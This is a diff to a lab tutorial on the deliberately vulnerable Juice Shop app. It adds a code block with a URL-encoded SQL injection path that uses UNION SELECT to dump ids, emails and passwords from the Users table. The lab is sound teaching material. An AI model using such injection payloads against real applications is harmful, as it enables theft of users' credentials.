@@ -35,6 +35,10 @@ Here is the vulnerable Juiceshop application. Next, we will try a simple SQL inj
 
 -  Paste the following path in your browser's location bar after https://10.1.20.200/
 
+  .. code-block:: none
+   
+    /rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--
+
   
 
 
